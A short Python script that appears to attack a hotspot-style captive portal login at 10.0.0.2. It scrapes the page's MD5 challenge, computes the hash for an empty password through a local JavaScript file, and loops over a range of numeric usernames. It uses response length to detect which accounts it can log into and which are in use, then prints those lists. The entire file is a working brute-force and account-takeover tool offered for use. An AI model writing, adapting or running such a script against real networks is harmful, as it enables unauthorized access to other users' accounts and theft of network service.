import urllib.request
import js2py 
import time 
import os

def first_html():
	url = "http://10.0.0.2/login"
	html_attempt = urllib.request.urlopen(url)
	html = html_attempt.read()
	return html.decode('utf-8')

def scrap(html):
	start = html.find("5('") 
	end = html.find("');",start)
	p_data = html[start+3:end]
	f_data = p_data.replace("' + document.login.password.value + '","")
	return f_data

def password_gen(data):
	path = os.path.join(os.path.dirname(__file__),"md5.js")
	md5_file = open(path, "r", encoding="utf-8")
	js = str(md5_file.read())
	js_data = js.replace('HeRe',data)
	password = js2py.eval_js(js_data)
	md5_file.close()
	return password

def login(user,password):
	t1 = time.time()
	url = "http://10.0.0.2:80/login"
	L_data = {"username": user , "password": password}
	L_data = urllib.parse.urlencode(L_data)
	L_data = L_data.encode("utf-8")
	login_attempt = urllib.request.Request(url,L_data)
	response = urllib.request.urlopen(login_attempt)
	check = int(response.headers["Content-Length"]) - len(str(user))
	page = response.read().decode("utf-8")

	if check < 1600:
		stat = " loged \a"
		urllib.request.urlopen("http://10.0.0.2/logout")
		loged_u.append(user)
		page = first_html()
	elif check < 3500:
		stat = " Used" 
		used_u.append(user)
	else:
		stat = "     "
	t2 = time.time()
	total = t2 -t1 
	print("" + str(user) + ": " + stat + " \t\t\tTime: " , total)
	return password_gen(scrap(page))


if __name__ == '__main__':
	first_user = int(input('First User: '))
	last_user = int(input('Last User: '))
	used_u, loged_u= [], []
	pas = password_gen(scrap(first_html()))
	for user in range(first_user,last_user+1):
		pas = login(user,pas)
	print("USED:   ", used_u)
	print("LOGGED: ", loged_u)
